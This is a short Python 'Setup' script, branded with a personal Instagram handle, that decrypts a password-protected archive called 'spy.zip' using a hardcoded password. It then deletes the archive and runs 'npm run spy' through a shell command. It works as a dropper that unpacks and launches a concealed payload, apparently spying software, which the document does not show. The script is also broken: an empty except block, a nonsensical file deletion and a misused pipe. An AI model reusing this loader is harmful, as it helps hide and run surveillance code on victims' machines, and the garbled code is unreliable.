
# ---------------- Imports
import os
import shutil

try:
    import pyzipper
    import colorama
    from rich import print
    from rich.panel import Panel
    import re
except ImportError:
    _ = os.system('pip install colorama' if os.name == 'nt' else 'pip3 install colorama')
    _ = os.system('pip install pyzipper' if os.name == 'nt' else 'pip3 install pyzipper')
    _ = os.system('pip install rich' if os.name == 'nt' else 'pip3 install rich')

import pyzipper
import sys
from time import sleep
from getpass import getpass
from colorama import Fore
from rich.panel import Panel
import os

# -------------------Colors
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"
g = "\033[0;90m"
y = r

# ------------------banners
logo = Panel("""
[bold white]</> [italic green] Bhardi Yavov [bold white]</>
[bold white] </> [italic green] instagram bhardiyavok [bold white]</>
""")

def banner():
    print(logo)

def cls_clear_func():
    os.system('cls' if os.name=='nt' else 'clear')

def exixting_directory_file(file):
    if os.path.exists(file):
        os.remove(file)

def designprint(samaywrite):
    print(logo)
    print("[bold red]"+"└─> "+'[bold white]'+"[bold green]"+samaywrite)
    print("[bold green]Please Wait Files Are Extracting ...")

def front_design():
    cls_clear_func()
    banner()

front_design()

class Setup:
    def __init__(self):
        # Senha fixa para o ZIP
        self.fixed_password = "itsawaspybystark"
    
    def mainFile(self):
        try:
            with pyzipper.AESZipFile('spy.zip', 'r', compression=pyzipper.ZIP_DEFLATED,
                                     encryption=pyzipper.WZ_AES) as extracted_zip:
                # Usa a senha fixa
                extracted_zip.extractall(pwd=str.encode(self.fixed_password))
                
            designprint('Password automatically applied, file unzipped successfully!')
            sleep(2.3)
            front_design()
            designprint('Successfully decrypted and unzipped file with password.')
            sleep(3.0)
            exixting_directory_file('spy.zip')
            os.system('mv main.ts Main/|npm run spy' if os.name=='nt' else 'mv main.ts Main/|npm run spy')
        
        except Exception as samay:


if __name__ == '__main__':
    exixting_directory_file('python index.py')
    main_start = Setup()
    main_start.mainFile()




